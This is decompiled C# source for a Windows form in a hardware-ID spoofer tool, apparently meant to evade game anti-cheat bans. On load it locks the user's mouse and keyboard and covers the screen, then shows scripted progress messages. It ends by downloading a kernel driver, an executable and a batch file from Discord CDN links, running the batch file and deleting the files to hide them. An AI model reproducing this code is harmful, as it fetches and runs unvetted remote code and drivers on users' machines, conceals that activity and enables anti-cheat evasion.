using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using HwidSpoofer;
using HwidSpoofer.Properties;

namespace Helix_Spoofer
{
	// Token: 0x02000006 RID: 6
	public partial class Spoof : Form
	{
		// Token: 0x0600001A RID: 26
		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern void BlockInput([MarshalAs(UnmanagedType.Bool)] [In] bool fBlockIt);

		// Token: 0x0600001B RID: 27
		[DllImport("Gdi32.dll")]
		private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

		// Token: 0x0600001C RID: 28 RVA: 0x00003D7C File Offset: 0x00001F7C
		public Spoof()
		{
			this.InitializeComponent();
			this.timer1.Start();
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00003DDC File Offset: 0x00001FDC
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.gunaProgressBar1.Value += 250;
			bool flag = this.gunaProgressBar1.Value >= 1000;
			if (flag)
			{
				this.cpu.Text = "Pairing with the privileged components...";
			}
			bool flag2 = this.gunaProgressBar1.Value >= 2000;
			if (flag2)
			{
				this.bios.Text = "Applying hardware serials modifcations...";
			}
			bool flag3 = this.gunaProgressBar1.Value >= 4000;
			if (flag3)
			{
				this.baseboard.Text = "Disconnecting from the privileged components.";
			}
			bool flag4 = this.gunaProgressBar1.Value >= 5000;
			if (flag4)
			{
				this.diskdrive.Text = "Cleaning files and registery entries...";
			}
			bool flag5 = this.gunaProgressBar1.Value >= 6000;
			if (flag5)
			{
				this.swofmac.Text = "Finializing execution with the server...";
				this.timer1.Enabled = false;
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/982366473865547837/988832479848828928/EAC_BE.sys", "C:\\Program Files\\Epic Games\\EAC_BE.sys");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/969969857082851398/980603333125501038/dlxmap_1.exe", "C:\\Program Files\\Epic Games\\dlxmap_1.exe");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/977990594091679855/982304295011643442/driverload.bat", "C:\\Program Files\\Epic Games\\driverload.bat");
				Process.Start("C:\\Program Files\\Epic Games\\driverload.bat");
				Thread.Sleep(700);
				File.Delete("C:\\Program Files\\Epic Games\\EAC_BE.sys");
				File.Delete("C:\\Program Files\\Epic Games\\dlxmap_1.exe");
				File.Delete("C:\\Program Files\\Epic Games\\driverload.bat");
				Spoof.BlockInput(false);
				Cursor.Show();
				spoofed spoofed = new spoofed();
				spoofed.Show();
				base.Hide();
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003F87 File Offset: 0x00002187
		private void Spoof_Load(object sender, EventArgs e)
		{
			base.Location = new Point(0, 0);
			base.Size = new Size(this.w, this.h);
			base.TopMost = true;
			Cursor.Hide();
			Spoof.BlockInput(true);
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00003FC5 File Offset: 0x000021C5
		private void gunaProgressBar1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x04000019 RID: 25
		private int w = Screen.PrimaryScreen.Bounds.Width;

		// Token: 0x0400001A RID: 26
		private int h = Screen.PrimaryScreen.Bounds.Height;
	}
}
